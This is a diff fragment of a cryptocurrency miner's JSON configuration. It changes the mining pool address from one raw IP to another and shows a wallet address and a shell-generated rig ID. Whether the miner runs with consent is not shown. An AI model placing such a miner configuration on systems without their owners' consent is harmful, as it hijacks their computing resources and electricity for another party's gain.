@@ -62,7 +62,7 @@
         {
             "algo": "rx/0",
             "coin": null,
-            "url": "103.127.30.129:443",
+            "url": "149.50.222.86:80",
             "user": "ZEPHs8j799QQFKmKFaHEJ85sGoNU3VgNGU7TF1ez9gjJRHb2XYVUPvgLS8okjGECMhcgx4HuJceLwXBEywNBR1gUP6tsD3K9iVY",
             "pass": "x",
             "rig-id": "$(shuf -n 1 -i 1-99999)-Bismillah",
